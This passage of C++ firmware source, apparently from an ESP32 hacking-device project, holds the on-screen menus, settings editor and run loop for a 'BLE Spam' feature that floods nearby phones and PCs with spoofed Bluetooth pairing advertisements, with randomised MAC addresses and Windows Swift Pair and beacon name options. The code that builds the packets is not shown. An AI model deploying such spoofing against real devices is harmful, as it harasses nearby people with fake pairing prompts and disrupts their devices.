            tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
            int footerY = tftHeight - FP * LH - 12;
            tft.fillRect(8, footerY, tftWidth - 16, FP * LH + 4, bruceConfig.bgColor);
            tft.drawCentreString("Click=Select  ESC=Back", tftWidth / 2, footerY + 2, 1);

            redrawRows = false;
        }

        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) {
            if (editState.editing) {
                switch (editState.edit_row) {
                    case 0: config.adv_ms = editState.adv_backup; break;
                    case 1: config.gap_ms = editState.gap_backup; break;
                    case 2: config.tx_power = editState.tx_backup; break;
                    case 3: config.mac_rand_mode = editState.mac_backup; break;
                }
                editState.editing = false;
                redrawRows = true;
            } else {
                return false;
            }
        }

        if (check(SelPress)) {
            if (editState.editing) {
                editState.editing = false;
                redrawRows = true;
            } else {
                if (cursor == 4) return true;
                editState.editing = true;
                editState.edit_row = cursor;
                editState.adv_backup = config.adv_ms;
                editState.gap_backup = config.gap_ms;
                editState.tx_backup = config.tx_power;
                editState.mac_backup = config.mac_rand_mode;
                redrawRows = true;
            }
        }

        if (editState.editing) {
            if (check(NextPress)) {
                if (editState.edit_row == 0) {
                    config.adv_ms = bleSpamAdjustMs(config.adv_ms, 1);
                    configChanged = true;
                } else if (editState.edit_row == 1) {
                    config.gap_ms = bleSpamAdjustMs(config.gap_ms, 1);
                    configChanged = true;
                } else if (editState.edit_row == 2) {
                    config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 1) % 4);
                    configChanged = true;
                } else if (editState.edit_row == 3) {
                    config.mac_rand_mode = static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 1) % 8);
                    configChanged = true;
                }
                redrawRows = true;
            } else if (check(PrevPress)) {
                if (editState.edit_row == 0) {
                    config.adv_ms = bleSpamAdjustMs(config.adv_ms, -1);
                    configChanged = true;
                } else if (editState.edit_row == 1) {
                    config.gap_ms = bleSpamAdjustMs(config.gap_ms, -1);
                    configChanged = true;
                } else if (editState.edit_row == 2) {
                    config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 3) % 4);
                    configChanged = true;
                } else if (editState.edit_row == 3) {
                    config.mac_rand_mode = static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 7) % 8);
                    configChanged = true;
                }
                redrawRows = true;
            }
        } else {
            if (check(NextPress)) {
                cursor = (cursor + 1) % 5;
                redrawRows = true;
            } else if (check(PrevPress)) {
                cursor = (cursor + 4) % 5;
                redrawRows = true;
            }
        }
    }
}

static void bleSpamRenderRunningScreen(
    const BleSpamSelection &selection, const BleSpamConfig &config, int cursor,
    const BleSpamEditState &editState, uint32_t displaySent, float displayPkt, bool blinkOn, bool fullRedraw,
    bool statsDirty, bool configDirty, bool blinkDirty
) {
    static int statsY = 0;
    static int configStartY = 0;
    static int rowH = 0;

    if (fullRedraw) {
        String title = bleSpamGetDeviceName(selection.attack_type, selection.device_index);
        drawMainBorderWithTitle(bleSpamMakeTitle(title));

        rowH = max(12, FP * LH + 4);
        statsY = BORDER_PAD_Y + FM * LH + 8;
        configStartY = statsY + rowH * 2 + rowH;

        tft.drawFastHLine(8, statsY + rowH * 2 - 2, tftWidth - 16, bruceConfig.priColor);
        tft.drawFastHLine(8, configStartY + rowH * 4 - 2, tftWidth - 16, bruceConfig.priColor);

        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        int footerY = tftHeight - FP * LH - 12;
        tft.fillRect(8, footerY, tftWidth - 16, FP * LH + 4, bruceConfig.bgColor);
        tft.drawCentreString("Click=Edit  ESC=Stop", tftWidth / 2, footerY + 2, 1);
    }

    if (blinkDirty) {
        tft.setTextSize(FP);
        tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
        int starX = tftWidth - 18;
        int starY = BORDER_PAD_Y + 2;
        tft.fillRect(starX - 2, starY - 2, 12, 12, bruceConfig.bgColor);
        tft.drawString(blinkOn ? "*" : " ", starX, starY, 1);
    }

    if (statsDirty) {
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

        tft.fillRect(10, statsY, tftWidth - 20, rowH * 2, bruceConfig.bgColor);
        char buf[24];
        snprintf(buf, sizeof(buf), "Sent:   %06lu", (unsigned long)displaySent);
        tft.drawString(buf, 12, statsY + 2, 1);

        snprintf(buf, sizeof(buf), "Pkt/s:  %.1f", displayPkt);
        tft.drawString(buf, 12, statsY + rowH + 2, 1);
    }

    if (configDirty) {
        BleSpamEditState viewEdit = editState;
        int drawCursor = cursor;
        bleSpamRenderConfigRows(config, drawCursor, viewEdit, configStartY, rowH);
    }
}

static bool bleSpamStoppedPrompt(const BleSpamSelection &selection, uint32_t sentCount) {
    int cursor = 0;
    bool redraw = true;
    bool layoutDrawn = false;
    const char *options[] = {"Restart", "Back to Config"};
    int optionCount = 2;

    while (true) {
        if (redraw) {
            if (!layoutDrawn) {
                String title =
                    String(bleSpamGetDeviceName(selection.attack_type, selection.device_index)) + " STOPPED";
                drawMainBorderWithTitle(bleSpamMakeTitle(title));

                tft.setTextSize(FP);
                char buf[32];
                snprintf(buf, sizeof(buf), "Sent: %06lu  Pkt/s: 0.0", (unsigned long)sentCount);
                int statsY = BORDER_PAD_Y + FM * LH + 8;
                tft.fillRect(10, statsY, tftWidth - 20, FP * LH + 6, bruceConfig.bgColor);
                tft.drawString(buf, 12, statsY + 2, 1);

                tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
                int footerY = tftHeight - FP * LH - 12;
                tft.fillRect(8, footerY, tftWidth - 16, FP * LH + 4, bruceConfig.bgColor);
                tft.drawCentreString("Click=Select  ESC=Back", tftWidth / 2, footerY + 2, 1);
                layoutDrawn = true;
            }

            int rowH = max(12, FP * LH + 4);
            int listY = BORDER_PAD_Y + FM * LH + 8 + rowH * 2;
            for (int i = 0; i < optionCount; i++) {
                int rowY = listY + i * rowH;
                bool selected = (i == cursor);
                uint16_t bg = selected ? bruceConfig.priColor : bruceConfig.bgColor;
                uint16_t fg = selected ? bruceConfig.bgColor : bruceConfig.priColor;
                tft.fillRect(10, rowY, tftWidth - 20, rowH, bg);
                tft.setTextColor(fg, bg);
                tft.drawString(String(selected ? "> " : "  ") + options[i], 12, rowY + 2, 1);
            }

            redraw = false;
        }

        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) return false;

        if (check(NextPress)) {
            cursor = (cursor + 1) % optionCount;
            redraw = true;
        } else if (check(PrevPress)) {
            cursor = (cursor + optionCount - 1) % optionCount;
            redraw = true;
        } else if (check(SelPress)) {
            return (cursor == 0);
        }
    }
}

static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &config) {
    bool restart = false;
    do {
        BleSpamRunState runState;
        uint8_t initialMac[6];
        bool haveMac = bleSpamGetNextMac(runState, config.mac_rand_mode, initialMac);
        bleSpamInitAdvertiser(runState, config, haveMac ? initialMac : nullptr, true);

        BleSpamEditState editState;
        editState.editing = false;
        editState.edit_row = 0;
        int cursor = 0;
        bool running = true;
        bool fullRedraw = true;
        bool statsDirty = true;
        bool configDirty = true;
        bool blinkDirty = true;
        bool blinkOn = false;
        uint32_t lastBlink = millis();
        uint32_t lastStatsUpdate = millis();
        uint32_t displaySent = 0;
        float displayPkt = 0.0f;

        while (running) {
            bleSpamSendTick(runState, config, selection);
            bleSpamUpdateStats(runState);
            esp_task_wdt_reset(); // CHANGED: feed watchdog to prevent WDT crash at tight intervals

            uint32_t now = millis();
            if (now - lastStatsUpdate >= BLE_SPAM_STATS_UPDATE_MS) {
                displaySent = runState.sent_count;
                displayPkt = runState.pkt_s;
                statsDirty = true;
                lastStatsUpdate = now;
            }

            if (now - lastBlink >= BLE_SPAM_BLINK_MS) {
                blinkOn = !blinkOn;
                blinkDirty = true;
                lastBlink = now;
            }

            if (EscPress && PrevPress) EscPress = false;
            if (check(EscPress)) {
                if (editState.editing) {
                    switch (editState.edit_row) {
                        case 0: config.adv_ms = editState.adv_backup; break;
                        case 1: config.gap_ms = editState.gap_backup; break;
                        case 2: config.tx_power = editState.tx_backup; break;
                        case 3: config.mac_rand_mode = editState.mac_backup; break;
                    }
                    editState.editing = false;
                    configDirty = true;
                } else {
                    running = false;
                }
            }

            if (check(SelPress)) {
                if (editState.editing) {
                    if (editState.edit_row == 2) {
                        bleSpamApplyTxPower(config.tx_power);
                        runState.applied_power = config.tx_power;
                    }
                    if (editState.edit_row == 0 || editState.edit_row == 1) {
                        runState.next_send_ms = millis() + config.adv_ms + config.gap_ms;
                    }
                    editState.editing = false;
                    configDirty = true;
                } else {
                    editState.editing = true;
                    editState.edit_row = cursor;
                    editState.adv_backup = config.adv_ms;
                    editState.gap_backup = config.gap_ms;
                    editState.tx_backup = config.tx_power;
                    editState.mac_backup = config.mac_rand_mode;
                    configDirty = true;
                }
            }

            if (editState.editing) {
                if (check(NextPress)) {
                    if (editState.edit_row == 0) {
                        config.adv_ms = bleSpamAdjustMs(config.adv_ms, 1);
                    } else if (editState.edit_row == 1) {
                        config.gap_ms = bleSpamAdjustMs(config.gap_ms, 1);
                    } else if (editState.edit_row == 2) {
                        config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 1) % 4);
                    } else if (editState.edit_row == 3) {
                        config.mac_rand_mode =
                            static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 1) % 8);
                        runState.mac_initialized = false;
                    }
                    configDirty = true;
                } else if (check(PrevPress)) {
                    if (editState.edit_row == 0) {
                        config.adv_ms = bleSpamAdjustMs(config.adv_ms, -1);
                    } else if (editState.edit_row == 1) {
                        config.gap_ms = bleSpamAdjustMs(config.gap_ms, -1);
                    } else if (editState.edit_row == 2) {
                        config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 3) % 4);
                    } else if (editState.edit_row == 3) {
                        config.mac_rand_mode =
                            static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 7) % 8);
                        runState.mac_initialized = false;
                    }
                    configDirty = true;
                }
            } else {
                if (check(NextPress)) {
                    cursor = (cursor + 1) % 4;
                    configDirty = true;
                } else if (check(PrevPress)) {
                    cursor = (cursor + 3) % 4;
                    configDirty = true;
                }
            }

            bleSpamRenderRunningScreen(
                selection,
                config,
                cursor,
                editState,
                displaySent,
                displayPkt,
                blinkOn,
                fullRedraw,
                statsDirty,
                configDirty,
                blinkDirty
            );

            fullRedraw = false;
            statsDirty = false;
            configDirty = false;
            blinkDirty = false;
            yield();
        }

        bleSpamDeinitAdvertiser();
        restart = bleSpamStoppedPrompt(selection, runState.sent_count);
    } while (restart);
}

// Show a 2-option popup. Returns 0 for first option, 1 for second, -1 for ESC.
static int bleSpamTwoOptionPrompt(const String &title, const char *opt0, const char *opt1) {
    int cursor = 0;
    bool redraw = true;
    bool layoutDrawn = false;
    while (true) {
        if (redraw) {
            if (!layoutDrawn) {
                drawMainBorderWithTitle(bleSpamMakeTitle(title));
                layoutDrawn = true;
            }
            int rowH = max(12, FP * LH + 4);
            int startY = BORDER_PAD_Y + FM * LH + 16;
            for (int i = 0; i < 2; i++) {
                int rowY = startY + i * rowH;
                bool sel = (i == cursor);
                uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
                uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
                tft.fillRect(10, rowY, tftWidth - 20, rowH, bg);
                tft.setTextColor(fg, bg);
                tft.setTextSize(FP);
                tft.drawString(String(sel ? "> " : "  ") + (i == 0 ? opt0 : opt1), 14, rowY + 2, 1);
            }
            redraw = false;
        }
        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) return -1;
        if (check(NextPress)) {
            cursor = (cursor + 1) % 2;
            redraw = true;
        } else if (check(PrevPress)) {
            cursor = (cursor + 1) % 2;
            redraw = true;
        } else if (check(SelPress)) return cursor;
    }
}

// Handle device selection for types with custom name lists (Swift Pair and Beacon)
// Returns true if a device/name was chosen and selection is ready to run.
// Sets bleSpamSwiftPairName / bleSpamBeaconName as side-effect.
static bool bleSpamHandleCustomNameDevice(
    BleSpamAttackType type, int deviceIndex, BleSpamSelection &selection, BleSpamConfig &config,
    bool &configChanged
) {
    const char *ns = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? "bs_sp" : "bs_bn";
    String &nameVar = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? bleSpamSwiftPairName : bleSpamBeaconName;

    int nPresets = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR)
                       ? (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))
                       : (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
    int randomIdx = nPresets; // Random/All is always right after presets
    int savedBase = nPresets + 1;

    std::vector<String> saved = bleSpamLoadCustomNames(ns);
    int addNewIdx = savedBase + (int)saved.size();

    if (deviceIndex == addNewIdx) {
        // User tapped "+ Add New Custom Name"
        String newName = keyboard("", 24, "Enter name");
        if (newName == "\x1B" || newName.length() == 0) return false;
        saved.push_back(newName);
        bleSpamSaveCustomNames(ns, saved);
        nameVar = newName;
        selection.device_index = deviceIndex;
        vTaskDelay(200 / portTICK_PERIOD_MS); // debounce — prevent stale press escaping to list
        return false;                         // return to device list, not to spam menu
    }

    if (deviceIndex >= savedBase && deviceIndex < addNewIdx) {
        // It's a saved custom name — show Use/Delete prompt
        int choice = bleSpamTwoOptionPrompt(
            String(saved[deviceIndex - savedBase]), "Use Saved Name", "Delete Saved Name"
        );
        if (choice == 1) {
            // Delete
            saved.erase(saved.begin() + (deviceIndex - savedBase));
            bleSpamSaveCustomNames(ns, saved);
            return false;
        } else if (choice == 0) {
            nameVar = saved[deviceIndex - savedBase];
            selection.device_index = deviceIndex;
            return true; // proceed to config+run
        }
        return false;
    }

    // Preset or Random/All — clear custom name var, just run
    nameVar = "";
    selection.device_index = deviceIndex;
    return true;
}

static void bleSpamMenuUi() {
    BleSpamConfig config = bleSpamLoadConfig();
    bool configChanged = false;

    while (true) {
        int attackIndex = bleSpamListLoop(
            "BLE Spam",
            bleSpamGetAttackOptionCount(),
            0,
            [](int idx) { return bleSpamGetAttackLabel(idx); },
            "Click=Select  ESC=Back"
        );

        if (attackIndex < 0) return;

        BleSpamSelection selection;
        selection.attack_type = bleSpamGetAttackTypeByIndex(attackIndex);
        selection.device_index = 0;

        // Types that go straight to config without a device list
        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
            while (true) {
                bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
                bleSpamSaveConfig(config);
                configChanged = false;
                if (!startAttack) break;
                bleSpamRunScreen(selection, config);
            }
            continue;
        }

        // Types with a device/name list
        while (true) {
            int deviceCount = bleSpamGetDeviceCount(selection.attack_type);
            int deviceIndex = bleSpamListLoop(
                String(bleSpamGetAttackLabel(attackIndex)) + " > Device",
                deviceCount,
                0,
                [&](int idx) { return bleSpamGetDeviceName(selection.attack_type, idx); },
                "Click=Select  ESC=Back"
            );

            if (deviceIndex < 0) break;

            // Swift Pair and Beacon need custom name handling
            if (selection.attack_type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR ||
                selection.attack_type == BLE_SPAM_ATTACK_BLE_BEACON) {
                bool readyToRun = bleSpamHandleCustomNameDevice(
                    selection.attack_type, deviceIndex, selection, config, configChanged
                );
                if (!readyToRun) continue;
            } else {
                selection.device_index = deviceIndex;
            }

            while (true) {
                bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
                bleSpamSaveConfig(config);
                configChanged = false;
                if (!startAttack) break;
                bleSpamRunScreen(selection, config);
            }
        }
    }
}

void spamMenu() { bleSpamMenuUi(); }
